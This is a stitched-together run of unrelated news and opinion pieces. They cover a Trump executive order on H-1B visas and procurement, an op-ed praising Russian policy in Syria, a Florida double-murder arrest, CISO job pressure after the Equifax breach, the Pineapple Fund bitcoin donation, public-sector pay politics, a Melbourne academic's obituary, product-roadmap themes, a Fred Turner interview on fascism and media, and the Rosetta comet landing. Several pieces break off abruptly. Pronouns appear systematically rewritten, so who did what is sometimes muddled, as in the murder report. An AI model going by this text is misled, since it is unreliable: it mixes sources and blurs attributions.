CLOSE Making good on their “America First” ideology, President Trump is adding further restrictions to H1-B workers. Nathan Rousseau Smith (@fantasticmrnate) explains. Buzz60
This file photo taken on December 13, 2016 shows then President-elect Donald Trump speaking at the Wisconsin State Fair Exposition Center in West Allis, Wisconsin. (Photo: DON EMMERT, AFP/Getty Images)
WASHINGTON — President Trump will sign a double-barreled executive order Tuesday that will clamp down on guest worker visas and require agencies to buy more goods and services from U.S. companies and workers.
Trump will sign the so-called "Buy American, Hire American" executive order during a visit to Snap-On Tools in Kenosha, Wis., Tuesday, said two senior administration officials who briefed reporters on the order Monday. The officials spoke on condition they not be identified because the cabinet-level officials who could discuss the matter on the record were unavailable.
By combining aspects of immigration policy with federal procurement regulations, Trump is using executive action to advance their philosophy of economic nationalism without waiting for action from Congress. But like many of their previous executive orders, the order will largely call on cabinet secretaries to fill in the details with reports and recommendations about what the administration can legally do.
Specifically targeted: The H-1B visa program, which allows 85,000 foreign workers into the United States each year to take specific high-skilled jobs with U.S. companies. The program is popular with the information technology industry, which Trump has accused of "importing low-wage workers on H-1B visas to take jobs from young college-trained Americans."
Related:
The executive order will stop short of the one- to two-year moratorium on new skilled worker visas that Trump called for during the campaign. And it comes too late to have a direct effect on this year's visa season, which opened April 3.
Instead, the executive order will look for administrative changes, including an overhaul of the lottery system used to determine which companies can sponsor the visas, one official said. Other visa programs, like the H-2B seasonal worker visa that Trump themselves uses to staff their Mar-a-Lago resort in Palm Beach, Fla., will be largely unaffected.
The "Buy American" portion of the order will tighten the waivers and exemptions that agencies use to get around procurement laws that favor American-made goods, and require agency heads to sign off on those waivers. It will require agencies to consider whether foreign governments are using unfair trade practices when considering the lowest responsible bidder. And it includes language requiring transportation projects to use steel "melted and poured" in the United States.
Trump will sign the order in Wisconsin, a state they won last November with an appeal to blue-collar workers and a promise to revive manufacturing jobs.

A lot of good people are asking a lot of good questions these days, and this is an excellent thing. On the foreign policy side, it happens the best of these questions are posed by non-Americans, for the simple reason most Americans are not ready to think clearly about our moment and how we have come to it. We do not ask because we cannot answer.
My three favorite questions of late, it also happens, have to do with Syria. And let there be no doubt: It is all over for the Obama administration, the Pentagon, the spooks and all others still pretending there is a “moderate opposition” that will carry the day in the many-sided Syrian conflict. Washington has slipped its grip. Others are in charge now, and as they pursue a solution to this crisis the only choice open to the U.S. is whether or not to join in the effort. It will be interesting to see which alternative the White House and the State Department choose.

“I cannot help asking those who have caused the situation, Do you realize now what you've done?” This is the first good question.
Vladimir Putin posed it in their speech to the U.N. General Assembly 10 days ago. Sensibly, the Russian president added, “But I am afraid no one is going to answer that.” To offer modest assistance, Mr. Putin, the U.S. leadership knows exactly what it has done, and this is why you are correct: Your query will go without reply.
The second and third good questions came from Mohammad Javad Zarif, Iran's foreign minister. For my money Zarif is among the ablest diplomats now on the scene. They addressed the U.S. on the Syria crisis during a conference in New York on Monday, and they asked, “Why are you there? Who gave you the right to be there?”
Wow, wow and wow.
I love these questions. The subtext in the three of them together is that the Obama administration's failure in Syria is now complete. Washington is no longer in charge. If there is a better example of language as power, I cannot think of what it is.
Putin forces us to consider the Syria crisis as history. This is the equivalent of dropping a neutron bomb on our nation's capital: All the Greek facades are intact, but the narrative incessantly spun behind them is dead. Read Putin's U.N. speech here. Read a few others and you recognize that the Russian leader has long understood history's potency, especially when deployed against the messes resulting from America's imperial adventures.

As to Zarif's line of inquiry, both parts are of interest. To ask why the U.S. is in Syria is to brush aside all the customary bunkum about Washington's humane outrage over the Assad regime's brutalities. Underneath we find an obsession with “regime change” in Damascus so as to convert Syria from outlier to another Middle Eastern client. Left to the U.S., Assad's successor, as in the case of al-Sisi in Egypt, would be welcome to all the brutalities they may find necessary. Almost certainly they would enjoy an arms package similar to Egypt's now-restored $5 billion annually—most of which is now deployed against Egyptians.
“Who gave you the right to be there?” What a simple, pithy question. I have not heard any American other than people such as Noam Chomsky ever consider such a thing. Throughout Washington's long effort to arm anti-Assad militias on the ground and more recently to drop bombs on Syrian soil—roughly 4,000 sorties to date—the illegality of U.S. policy simply never comes up.
Zarif thus forces two bitter truths upon us. One, we have been breaking the law from the first. We may not have anything to say about this, as we have not to date, but the silence will be conspicuous from here on out, given that others are now prepared openly to challenge the U.S. on the point. Two, whatever one may think of the Assad government, those now committed to backing it as part of their strategy to defeat radical Islamists in Syria do so in accordance with international law. Like it or not, this counts.
Speaking strictly for myself, I like the idea of a global community that proceeds lawfully. It tends to reduce the incidence of disorder and anarchy created by such entities as the Islamic State and the Pentagon.

It is now several weeks since Russia let it be known that it would reinforce its long-standing support of Bashar al-Assad with new military commitments. First came the materiél. Bombing runs began a week ago. On Monday, a senior military official in Moscow announced that Russian troops are to join the fight against the Islamic State.
We are always encouraged to find anything Putin does devious and the outcome of hidden motives and some obscure agenda having to do with their pouting ambition to be seen as a first-rank world leader. From the government-supervised New York Times on down, this is what you read in the newspapers and hear on the radio and television broadcasts. I urge readers to pay no attention to this stuff. It is all about Washington's agenda to obscure.

Russia's favored strategy in Syria has long been very clear. It is a question of distinguishing the primary and secondary contradictions, as the Marxists say. The Assad regime is to be kept in place so as to preserve those political institutions still functioning as the basis of a reconstructed national government. Once the threat of Islamic terror is defeated, a political transition into a post-Assad reconstruction can be negotiated.
For a time it appeared that Washington was prepared to buy into this set of expedients. This impression derived from the very frequent contacts between John Kerry and Russian Foreign Minister Sergei Lavrov, with whom the American secretary of state has often worked closely.
Then came the fateful encounter between Obama and Putin at the U.N. Obama spoke first, Putin afterward. Then the two met privately.

A few days ago a source in Moscow with good lines into Kremlin thinking wrote a long note on the Obama-Putin encounter in New York. Here is some of what this source said:
The meeting with Obama in New York did not go well. It was extremely contentious, and Obama did not engage. Putin made the case that the important first priority had to be to eliminate Daesh [the Islamic State], and that after more than a year of the U.S. campaign there has been no significant success. Indeed, the contrary is the case. Putin's point was that air power alone will not succeed, and that now the only real boots on the ground are the Kurds and the armies of Syria and its supporters—Hezbollah and some Iranians, but the Iranians troops involved in the struggle with Daesh are operating mostly in Iraq. Putin proposed creating a coalition, the equivalent of the anti-Hitler alliance, to focus on Daesh, and then focusing in Round 2 on the transition of Syria into a form of decentralized federation of highly autonomous regions—Kurdish, Sunni, Alawite-Christian and a few others—which all work together now. Putin had been led to believe through the Lavrov /Kerry channel… that there would be a broader agreement to work together. So they were surprised that Obama did not seize the opportunity to engage the battle in a coordinated way…. In the end they agreed only on coordination between the two militaries to avoid running into each other. Putin left New York with the view that it is now much more important to support the government in Syria than they had thought before they went, because they came convinced that the U.S., left to its present course, is going to create another Libya, this time in Syria. Israel has a similar view, as does Egypt, Iran, and, increasingly, countries in Europe. With Daesh already so deeply implanted, this would lead to vast crisis—military, political, economic, humanitarian—that would spread across all of the Middle East, into the Caucasus and across North Africa, with millions of refugees….
There are four things to say about this account straight off the top. One, the subtext is that Putin reached the point in New York when they effectively threw up their hands and said, “I'm fed up.” Two, Obama went into that meeting more or less befuddled as to what to say. In a word, they were outclassed.
Three, the strategy Putin presented to Obama is clear, logical, lawful and has a good chance of working. In other words, it is everything the Obama administration's is not, Kerry's efforts to work with Lavrov notwithstanding.
Four and most important, the history books may well conclude that the U.N. on Sept. 27 was the very place and the very day the U.S. ceded the initiative to Russia on the Syria crisis. This is my read as of now, although in circumstances this kinetic it is too perilous to anticipate what may come next.

The American press has been slightly berserk subsequent to the U.N. encounter, putting more spin on the new Russian policy than a gyroscope has in space. Putin is weak and desperate, they are making Syria more violent, Russian jets are bombing CIA-backed “moderates” and not ISIS, this is Russia's second Afghanistan, nothing can work so long as Assad remains in power.
“Putin stupidly went into Syria looking for a cheap sugar high to show their people that Russia is still a world power,” Tom Friedman, a standout in this line, wrote in the Times last week. “Watch them become public enemy No. 1 in the Sunni Muslim world. ‘Yo, Vladimir, how's that working for you?'”
I read all this with a mirror: It is nothing more than a reflection of how far below its knees the Obama administration's pants have just fallen. Who went stupidly into Syria, Tom? Yo, Tom, your lump-them-together prejudices are showing: Most of “the Sunni Muslim world” is as appalled by the Islamic State as the non-Sunni Muslim world.

What a weird sensation it is to agree with Charles Krauthammer, one of the Washington's Post's too-numerous right-wing opinion-page writers. It is like traveling in a strange, badly run country where something always seems about to go wrong.
“If it had the wit, the Obama administration would be not angered, but appropriately humiliated,” Krauthammer wrote in last Thursday's paper. “President Obama has, once again, been totally outmaneuvered by Vladimir Putin.”
It is a lot better than Tom Friedman's driveling defense of the president. Somewhere, at least, a spade is still a spade. But with this observation the common ground with Krauthammer begins and ends. Obama has got it radically wrong in Syria—and indeed across the Middle East—but not in the ways we are encouraged to think. Where lie the errors, then?
The first and biggest of them is their willingness to inherit the vision bequeathed by 117 years of American ambition abroad. In the American imperium it is all about us, always. Syria is not Syria, a land of 23 million people (before the exodus we prompted) just as Egypt as it aspired to democracy during the Arab Spring was not Egypt. These are squares on the geopolitical game board. In the Syria case, Russia has a strategy that is prima facie rational and right, but we must object because it is Russia's. Certainly we cannot join Moscow to make common cause.

Putin and Zarif and others now posing questions are telling Washington something it will have to hear if it is to get off the destructive course of American foreign policy: This is not about you, as many things in the world are not. This is about a political, social and cultural crisis that requires the disinterested attention of those capable of contributing to a solution.
Think about the united front Putin proposes and Obama declines to join. It is already in motion, in case you did not notice. Moscow, Tehran, Baghdad and Damascus are all now committed to cooperating—not the least by way of intelligence sharing, which is a big one—in the fight to subdue the Islamic State.
But isn't it true that Russia is bombing targets other than the Islamic State, some of which are rebel groups the CIA has backed? Possibly, although I have not taken the Pentagon's word for anything since 1966 or so. In my read Russian jets are probably hitting those groups most immediately threatening Damascus—no surprise, given the stated mission is to keep Assad in the presidential palace until the fighting stops. Why, in any case, should Russia discriminate between one rebel group and another, when “moderate opposition” is nothing but a fantasy out of the Reaganists' old “freedom fighter” narrative?
But isn't Putin about to reclaim influence in the Middle East that the Soviet Union lost long ago? This may be, but sometimes a cigar is just a cigar: Putin sees the Syria crisis spinning out of control and wants it resolved before it spreads just as the Kremlin now fears. In my read, reclaimed influence in the region will be a follow-on consequence. To the extent it materializes, we will have to get used to calling it multipolarity. If you think the record of American primacy in the Middle East is something worth preserving at the exorbitant cost it exacts, please use the comment box and enlighten all of us.

Obama's second big mistake has to do with their response to the problem of American exceptionalism. One had a sense late during their first term and into their second that they understood it was time to lance this boil on the American consciousness, but in the breach they seem to have demurred.
The result has been their commitment to keep American troops out of conflict zones but to maintain the posture by way of Air Force bombers and supposedly surgical drone attacks. They thus altered only method, not purpose, the desired outcome—as, again, they inherited it. Not only has it failed to achieve any result in Syria; the grotesque bombing of a Médicins sans Frontière hospital in Kanduz, Afghanistan, last weekend reveals the strategy to be a bust on any kind of life-saving, humanitarian grounds, as well.
There is no having your cake and eating it, in short.
We are now going to get earfuls as to how the answer in Syria now is to make greater military commitments, all on our own—Obama's sin being their gingerly thinking. It is upside down. A good president—and this is why one finds it hard to line up behind Hillary—needs to take on America's intentions as well as its tactics.

In my read, Russia and Iran have just popped open the door to a solution in Syria. All the pieces are in place but one: Washington's capacity to acknowledge the strategic failure now so evident and to see beyond the narrowest definition of where its interests lie.
This brings us to the paradox embedded in those questions Putin and Zarif and a few others now pose: American primacy is no longer in America's interest. Get your mind around this and you have arrived in the 21st century.
After nearly a week on the run, Darryl Hanna Jr. was arrested at a home in East Bradenton. Hanna is charged with two counts of second-degree murder after police say they shot and killed security guard Kevin Carter and clerk Timothy Hurley during a robbery.
During a news conference on Thursday morning, Longboat Key police confirmed that Hanna was also employed part-time at the resort as a security guard.
"He was clearly familiar with the layout of the building and the entrances and that likely caused them to get in without being noticed," said Police Chief Pete Cumming.
Police say they have no indication that the crime was an inside job.
Victory Security Agency issued the following statement:
It has come to our attention that a former employee of Victory Security Agency has been arrested for involvement in the recent murders on Longboat Key.
We will continue to cooperate with local law enforcement agencies during their investigation. We are not aware of anything specifically related to this investigation other than any information released to the media at this point.
As the investigation continues, we will have no further comment other than what is provided by the appropriate County or State agency.
“It's a relief to know,” Carter's finance Tom Swigeart said. “I miss them more than anything in the world but I'm glad they got somebody.”
The pain and suffering Swigeart's endured over the past six days is unimaginable. Swigeart and Carter were set to be married on Nov. 11 after 24 years together.
“I'm still not sure it is real I still keep waiting for them to come home,” Swigeart said.
At 4 p.m. Wednesday afternoon Swigeart got the first of many questions answered. But learning the name and seeing the face of the man police arrested for their fiancé's murder isn't enough.
“One of my biggest mental problems right now is thinking that they laid there and suffered…I want to think they died quick,” Swigeart said. “Now that they got a guy in custody maybe they'll release more information. I want to know exactly why they did it. I want to know detail for detail why they did it. I mean I can't see taking somebody's life for $600 (or) $900 whatever they got. here was no point in that.”
Hanna was arrested without incident at a residence in E. Bradenton by members of the Longboat Key Police Department and Manatee County Homicide Investigative Unit.
They have been charged with two counts of second-degree murder and one count of armed robbery.
Hanna remains in jail with no bond.
Hurley's family could not be reached for comment regarding Hanna's arrested. But, previously released a statement regarding the tragic incident:
Hackers worldwide are on a tear, and breaches occur at a quickening pace. If something goes wrong, the chief information security officer, or CISO, gets the blame.
WASHINGTON — The paycheck is big. The career security is great. But the headlines are a headache.
The job is to guard the key digital secrets of a major organization, perhaps proprietary manufacturing methods of a company, or health records of a hospital system. Or credit-card information at a major retail chain. Tolerance for failure is nil.
Yet hackers worldwide are on a tear, and breaches occur at a quickening pace. If something goes wrong, the chief information security officer, or CISO, gets the blame.
“Being a CISO means keeping that résumé polished,” said Chase Cunningham, a security and risk analyst at Forrester, a technology-research company in Cambridge, Mass.
Equifax, one of the nation's big three credit bureaus, announced Sept. 7 that it had been hit by a massive breach, and a week later it said its chief information officer and chief security officer had resigned. That didn't calm the storm for Equifax, which guards the personal financial history of half of the U.S.; CEO Richard Smith was forced out Monday.
It is little wonder that some qualified people won't take jobs as chief information security officers. Among them is Cunningham, who has a doctorate in information security, a background at the top-secret National Security Agency and an acute sense of how to fend off the bad guys. They said the job involves “guaranteed failure.”
“It's about the only executive-level job I can think of where you are 100 percent accountable for the failures to come, even though it's a guarantee that (they) will happen at some point,” Cunningham said.
“It's like playing chess with a blindfold on,” added Cunningham. “You cannot win.”
Tech honchos blame their higher-ups — the bosses who don't understand the threats, don't want to spend money in an area that has no apparent return and don't want to take responsibility when things go awry.
The job of CISO (pronounced see-so) used to be the digital equivalent of stocking the moat around the castle with crocodiles and making sure the drawbridge functioned.
“In the past, it was about defending the perimeter,” said Godfrey R. Sullivan, a former chief executive and current chairperson of Splunk, a San Francisco company that produces software to analyze high volumes of machine-generated data.
But Sullivan said hackers now most likely have gotten past the perimeter and reside in target networks.
“The bad guys are in your building,” Sullivan said. Information security officers nowadays have to hone their skills at continuous analysis of the data both entering and leaving the networks, they added.
Indeed, breaches may be inevitable. “The longtime folks have been saying, it's not ‘if' but ‘when,' ” said Rich Barger, director of security research at Splunk.
CISOs get in trouble, Sullivan said, when they discover breaches and don't act quickly. That may have happened at Equifax.
According to security researcher Brian Krebs, one of the vulnerabilities of Equifax was at its Argentine operations, when hackers discovered they could access its website by typing in “admin” at login and “admin” at password. Another vulnerability involved failure of Equifax to patch a known security hole in its website application software that came to light in March.
For those caught by headline-grabbing breaches, job security may be shaky. But a shortage of experts in cybersecurity is such that landing another job is nearly assured. “It's not hard to get another job, as there are plenty of them out there,” and honestly it's ‘good' if you have been through a breach, but it sure isn't painless, Cunningham said.
Adding to the difficulties of guarding digital storehouses, experts say, is a deluge of threat intelligence reports. Alerts come in all day long of potential vulnerabilities in software and types of malicious code.
“There's a ton of cyberthreat intelligence out there,” said Christopher Wlaschin, the CISO at the Department of Health and Human Services, noting that some of it is little more than snippets of suspect malicious code. Wlaschin spoke at the recent ICIT Cyber Intelligence Briefing in Washington, D.C.
Hackers are constantly evolving, and adopting new techniques, targeting new things, making successful defense a temporary — and perhaps unnerving — condition. “So it's constantly a game of whack-a-mole,” said Ron Plesco, who works in the cyber-response service at KPMG one of the big four global auditing companies.
When a serious breach comes to light, executives want someone to blame.
Travis Farral, director of security strategy at Anomali, a Redwood City, California, said information security officers who manage the techies on their team with appropriate caution about the gamut of threats often do better.
“They are responsible for the culture of security within an organization. They have the ability to have a voice with senior leadership,” Farral said. “Those who are effective at doing that stay out of the news.”
Anonymous bitcoin enthusiast is giving away $86 million to charity. Is it a scam or can you apply for donation? Sam Aiken Blocked Unblock Follow Dec 15, 2017
On December 13th a redditor submitted a post “I'm donating 5057 BTC to charitable causes! Introducing The Pineapple Fund”. Their post immediately got thousands likes and comments and rose to the top. Let's do a little investigation and try to understand if it's a sophisticated scam-scheme or a real charity project. (His BTC address is public on official website, so I assume that they don't mind people investigating it to check their real intentions.) Pineapple fund Official website pineapplefund.org domain was registered on December 4 and stayed blank for 9 days. whois.com (archive) And at the same day (Dec, 4) they tried to withdraw their funds from Bitfinex. reddit.com/r/bitfinex (archive, img) Since Bitfinex is constantly under DDoS attacks and users have big problems withdrawing their funds, it took them 2 days (tx1, tx2) to withdraw ~600 BTC from Bitfinex, and finally this money joined the pineapple fund.
NJ Governor Chris Christie giving a schoolteacher what-for YouTube There's no question that stories about the pay of public sector workers (especially the unionized ones) resonate intensely with folks.
During a time when everyone's talking about austerity, and state and city governments face widespread solvency concerns, it's a great time to take pot shots at those who work for the government.
And as POLITICO notes, everyone's taking part in the sport:
Republicans around the nation have cheered New Jersey Gov. Chris Christie, whose shouting match over budget cuts with an outraged teacher—"You don't have to" teach, they told them without sympathy—became a YouTube sensation on the right last week.
And even Democrats, like the nominee for governor in New York, Andrew Cuomo, have echoed the attacks on unions.
Christie is merely the most florid voice for a calculated, national effort to fundamentally reshape the debate on the labor costs that account for the bulk of government spending at every level. And at the core of the shift is a perception among many political leaders that public anger at civil servants is boiling over.
"We have a new privileged class in America," said Indiana Gov. Mitch Daniels, who rescinded state workers' collective bargaining power on their first day in office in 2006. "We used to think of government workers as underpaid public servants. Now they are better paid than the people who pay their salaries."
The big problem is the perceived lack of equality in sharing the pain. Private sector workers have seen layoffs and big paycuts. That's happened a bit in the public sector, but it's been far less visible, and the fact that the public sector is more unionized has helped the ones on the inside greatly fight reform.
If things don't snapback soon, it feels as though the dam is about to break on this, and that in states like New Jersey, Illinois, California, New York, and others, the backlash against public sector workers -- whether fair or not -- is about to bite.

Melbourne transport and planning expert Paul Mees has died following a 15-month battle with cancer.
Professor Mees, who taught at RMIT, was aged 52 and died on Wednesday in a Melbourne hospital.

An international authority in their field, Professor Mees for more than two decades repeatedly embarrassed Victorian transport operators and authorities with their research and commentary on the state's road, rail and urban planning systems.
Most recently, they had questioned the Napthine government's proposed east-west tunnel, arguing there was little substantial research behind the $6-8 billion project.
A former industrial lawyer, Professor Mees was the president of the Public Transport Users Association from 1992 to 2001.
In 1998, they began teaching urban planning at Melbourne University - only to fall out with the university a decade later after it demoted them following a complaint against them by the state government.
The PTUA's president Tony Morton said on Wednesday night that Professor Mees had for many years "personified the transport debate in Victoria, and called successive governments to account for their neglect of public transport".
You don't often see political candidates using bumper stickers and campaign slogans like, “Vote for me, and together we can repeal H.R. 1721, Sub-Section 4.1(b)!”
Candidates for political office almost always choose easy-to-digest themes, such as “Let's Put America Back to Work,” or “Make Our Country Strong Again,” or “Prosperity Through Unity.”
There are many good reasons for organizing a political campaign — or driving a product or customer initiative — around “themes,” or high-level strategic objectives. For example:
Themes quickly and clearly communicate your “why” — your overall strategy or goal.
Themes appeal to emotion, a highly effective way of earning audience buy-in.
Themes help keep everyone focused on a single objective, regardless of what parts of the initiative they are working on.
Themes can bring out ideas and creativity across the team, which likely would not surface if the people working on the initiative could see only a series of disjointed tasks and not a big-picture goal.
Example Themes
To give you a better idea of how themes fit into roadmaps, and how product managers can use themes to their advantage in a number of ways, let's walk briefly through a couple of examples.
Theme 1: “Make the product easier to try and buy.”
Now there's a useful theme! To be sure, though, let's check it against our list above of value propositions for themes in general.
Does this theme quickly and clearly communicate a strategic objective, a “why”? Check. Does it appeal to emotion? Check. Who could argue with making your product easier to try and buy? Will it help everyone involved stay focused on a single objective throughout the process? Check. And will it bring out more creative energy from your teams because they understand what their individual tasks are ultimately designed to accomplish? Perhaps, perhaps not. But the chances of this happening clearly better than if everyone was working on their specific jobs not fully knowing what you were hoping to achieve.
This theme will have many sub-sections — “epics,” “stories,” “features.” For example, one focus of making the product easier to try will be to streamline the trial sign-up experience on your website. Perhaps it now takes several screens and answering many questions to complete the sign-up. Perhaps the user even has to input credit card information at this stage.
Also, for the second part of our theme — making the product easier to buy — one story might be to improve the follow-up communication process, making follow-up emails shorter and more directed to a simple purchase experience.
Now all of your constituents and stakeholders can see the “why,” the strategic reason for shortening the post-sign-up emails, a shorter trial sign-up process, the removal of the credit card step at the trial level, etc.
How Themes Can Protect Your Initiative From Getting Off Track
Now let's imagine you're presenting your roadmap to the marketing team, to bring them onboard with your request to update the communication process for anyone who signs up for the trial version. The team understands what you're trying to accomplish, and they are enthusiastic about revamping the follow-up emails with this new objective of making the whole process easier for the customer.
But then the marketing VP suggests that the new sign-up procedure will be a great chance to include a few survey questions. They even have a solid reason: It will allow their team to more appropriately tailor their follow-up emails.
Your answer? No.
Why? Because as much as you'd like to use this captive-audience moment to gather user information, it will go against your theme — to make the product easier to try and buy. And because you have such a clear theme, your marketing VP understands your reasoning.
Theme 2: “Create a great ATM experience for our customers.”
This theme, for a product manager in the consumer banking industry, also provides a useful framework to help drive a successful initiative.
It's a clear way to explain a strategic goal, under which all of the disparate tasks and feature requests will have real context. It can earn the needed buy-in from stakeholders and constituents because it appeals to them on an emotional level. And it will help keep everyone involved focused on a big-picture objective, rather than allow them to get lost in the details and complete their portions of the initiative without fully understanding why.
What are some of the stories that might fall under this theme to create a great ATM experience?
Combine several of the screens to make the whole experience faster.
Make receiving cash the final step in the experience, so the customer can leave immediately when they have cash in hand.
Change the card process, so that the machine returns the customer's card immediately after processing the PIN.
All of these details are logical in their own right and might even have evidence to support their implementation. Kicking out the customer's card immediately, rather than at the end of the transaction, might be required because customers often forget that their cards are still in the machine, and leave without them. Holding the cash until the final step makes sense for security reasons.
But each of these stories, and the individual tasks that will follow from them, will be clearer and more persuasive if they all roll up to a strategic, easy-to-understand theme like “Create a great ATM experience for our customers.”
Themes Can be a Valuable Tool for Better Roadmaps and, Ultimately, Better Products
Because they have to communicate their product's strategy and plans to many different groups, product managers often have difficulty ensuring they are presenting the right level of detail, and using the proper focus, to resonate with each constituency. Getting this wrong can have serious, negative consequences for the initiative.
Present a roadmap to executive stakeholders that delves too quickly and too deeply into the individual features — without first communicating the strategic or financial value to the company — and the product manager risks losing buy-in needed to move forward. Focus entirely on project tasks and timelines in a product meeting with developers — without first orienting everyone around the big-picture reason they'll be taking on these tasks — and the product manager will have at best an unenthusiastic team, and at worst a confused one.
This is why it is so valuable to build your initiatives around a central theme — a strategic guide, or hook, that brings together all of the downstream stories, tasks, features and other details. Themes can work universally — with developers as well as executive stakeholders, with marketing and sales teams as well as your customers.
Starting with a high-level theme is like letting your constituents know right away, “This is why we are going to be taking on all details we're about to discuss, in the order I will be proposing them.” It's also the fastest, simplest way to reach your constituents on an emotional level and bring them over to your side.
And finally, when the inevitable happens — and someone proposes a deviation from your plan, even for a good reason — your theme can serve as a guidepost to remind them of the original strategic objective.
Fascism and The Historical Irony of Facebook's “Fake News” Problem
Kim-Mai Cutler Blocked Unblock Follow Nov 23, 2016
Fred Turner is a Stanford-based historian of 20th century media, who chronicled the emergence of what became the Internet from the ideals of 1960s Bay Area countercultural movements in their book “From Counterculture to Cyberculture.”
They also happened to write a book called, “The Democratic Surround: Multimedia and American Liberalism from World War II to the Psychedelic Sixties,” about how American media artists and theorists were disturbed by the tendency of radio and film to foment fascist movements in Europe in the 1930s and tried to create a new, more democratic approach to media in the U.S. in response.
Before the election, Turner and I did an event on Silicon Valley's effect on American democracy at the San Francisco's Mechanics Institute, which was founded by the city's artisans, craftsmen and inventors in 1854 to address the educational needs of the rapidly growing Gold Rush city.
I wanted to catch up and get their reflections on the election and Facebook and Twitter's impact on American politics. Much of the discussion in the press feels ahistorical and there is this irony in that the ideas behind networked and peer-to-peer media are rooted in a resistance to fascism and emerged from the lessons of World War II.
Q: So can you explain the core argument of your book?
Turner: In the late 1930s, when Germany turned fascist, Americans were mystified. Our intellectual leaders had long thought that Germany was the most culturally sophisticated nation in Europe. They were all asking how this had happened.
How did the country that brought us Goethe and Beethoven bring us Hitler?
Many Americans blamed the mass media. They had two different ways of thinking about it. First, some believed that Hitler and their clique were clinically insane. Somehow they had transferred their madness over the radio waves and through newsreel movie screens to ordinary Germans. Second, many believed that one-to-many media forced audiences into an authoritarian kind of passivity. When everyone turned their eyes and ears in the same direction, they appeared to be acting out the obedience expected of fascist citizens.
When World War II started, the Roosevelt administration wanted to create propaganda to make Americans fight fascism abroad. But the problem was — what media were they going to use? If they used mass media, they risked turning Americans into authoritarians. But if they didn't, they wondered, how would they achieve the national unity they needed to fight fascism?
There was one school of thought that said, “We'll just copy [Joseph] Goebbels. We'll de-program Americans later [if they turn totalitarian].”
But there were about 60 American intellectuals who were part of something called the Committee for National Morale who had another idea. These were people like anthropologists Gregory Bateson and Margaret Mead, psychologist Gordon Allport, and the curator Arthur Upham Pope.
They believed that we needed to create a kind of media that would promote democratic personalities. And if we did that, we could prevent racist nationalism. They dreamed of media that would surround you, that would require you to make your own choices and use your individual perception to define the images that mattered most to you. It was meant to be a kind of media environment within which you could make your own decisions, and so become more individually unique. At the same time, it put you in the company of others doing the same thing. The environment was designed to help forge both individual identity and collective unity simultaneously.
The Committee for National Morale didn't end up making media. But a group of Bauhaus artists, who were escaping Hitler's Germany, took up their ideas and began creating immersive, multi-image environments. Their first big work was a propaganda exhibition called “The Road To Victory” at the New York Museum of Modern Art in 1942. Herbert Bayer and Edward Steichen surrounded visitors with images of all different sizes so that people could choose to be citizens in the company of others. It's a form that surrounds you, which is why I called the book “The Democratic Surround.”
Over the next 50 years, through a series of twists and turns, the democratic media dreams of the Committee for National Morale actually set the stage for Facebook, Twitter and other kinds of peer-to-peer media.
The irony is that with Donald Trump, we are seeing a medium and a set of tactics designed to confront fascism being used to produce a new authoritarianism.
Benito Mussolini was an Italian politician, journalist, and leader of the National Fascist Party, went on to rule the country as Prime Minister from 1922 to 1943. They ruled constitutionally until 1925, when they dropped all pretense of democracy and set up a legal dictatorship.
Q: What is fascism and how would you define it?
Turner: Fascism, and authoritarianism more generally, is about particular political movements in the early 20th century. They generally feature a leader with dictatorial powers, a single party and the ability to enforce the will of party through military means. You can think of Mussolini's Italy, Hideki Tojo's Japan and Nazi Germany.
Some key elements of fascism include the following:
A reversionary desire to return to an imagined state of greatness from the past. A celebration of heterosexual masculinity. You could think of Vladimir Putin's need to take off their shirt or Donald Trump's obsession with the size of their hands. A charismatic leadership style. An absolute disregard for facts and a celebration of myth. An integration of the corporation and the state, which is what Mussolini wanted to do and feels reminiscent of what Trump wants to do today. A deep, structural racism. There is always someone on the outs. In Japan, it was particular minority groups. In Germany, it was obviously the Jews, but it was also gypsies, queers and communists, among others. And you can see that kind of racism, that kind of in-group and out-group dynamic here, with Trump.
Many people have called Donald Trump a populist. I don't think that's quite right. Their anti-elitist rhetoric is certainly in that vein, but their racism, their sexism, and their emphasis on a return to a formerly great America, belong to the fascist line.
To me, the constellation of forces that he's put into play look like early Mussolini. The key difference is that Mussolini and Hitler came to power by essentially building parties first. Trump has used the media to take over an existing state apparatus. Whether he's able to do what they want or not, whether he's competent or not, and whether institutions will resist him, that's an open question. I don't think he's Andrew Jackson though.
Q: Let's go back to media now. You're talking about media exhibitions in the 1940s. How does the work that these thinkers and artists were doing translate to how online media works today?
Turner: The multi-media images in “The Democratic Surround” provide a glimpse of the kind of perceptual world that media thinkers believed would make us less racist and more embracing of our differences. It's a world in which we're meant to practice looking at and identifying with others who are not like ourselves.
The surround aesthetics of the 1940s came to shape the 1950s, 60s and 70s by moving through two worlds. One, they became the basis of cold war propaganda exhibitions. Well into the 1960s, Americans built multi-image propaganda environments, with an eye toward democratizing populations in authoritarian countries. They built multi-image environments as part of trade fairs or exhibitions in the belief that they would give people the ability to practice the modes of perception that democracy depends upon.
Above is “The Family of Man,” a traveling photography exhibition that was meant to show the common bonds of humanity. The U.S. Information Agency transported the exhibit to countries around the world, to showcase the argument for peace and human brotherhood despite the risk of nuclear war with the Soviet Union.
In 1955, Edward Steichen built what remains the most influential of these environments, “The Family of Man.” It was an exhibition of 500 photographs of people around the world, hung in a surround format. The US government sent the exhibition around the world for a decade. It's now on permanent display in Luxembourg. The show's catalog has sold more than 8 million copies.
The second way the surround aesthetic has come down to us and helped drive the rise of social media is through the art world. Thanks to John Cage, it became the basis of Happenings in New York in the late 1950s. Cage believed that concerts and symphonies embodied the hierarchies of old Europe and were essentially exercises in domination by aural means. They knew the Bauhaus refugees well. And so they did with sound what they had done with pictures. They designed sonic surrounds that would open people up to listening to sounds around them and choosing the ones that were most valuable to them.
In the late 1950s they taught these techniques to the artists who made the first Happenings. Then the people who are hanging out in this art world, like Stewart Brand, saw this open surround form and took it with them to make things like the 1966 Trips Festival in San Francisco, which was a psychedelic surround.
Photo released by the European Space Agency shows an artist impression of Rosetta's lander Philae (back view) on the surface of comet 67P/Churyumov-Gerasimenko © ESA/AFP/File Medialiab Paris (AFP) - One of the biggest gambles in space history comes to a climax on Wednesday when Europe attempts to make the first-ever landing on a comet.
Speeding towards the Sun at 65,000 kilometres (40,600 miles) per hour, a lab called Philae will detach from its mothership Rosetta, heading for a deep-space rendezvous laden with risk.
The 100-kilogram (220-pound) probe will seek out a minuscule landing site on the treacherous surface of an object darker than coal, half a billion kilometres (300 million miles) from home.
"It's not going to be an easy business," was the understated prediction of Philippe Gaudon of France's National Centre for Space (CNES) as the mission prepared to enter countdown mode.
The stakes facing Rosetta managers in Darmstadt, Germany are daunting as the 1.3-billion-euro ($1.61-billion) project reaches a peak.
Two decades of work have been poured into what could be a crowning moment in space exploration.
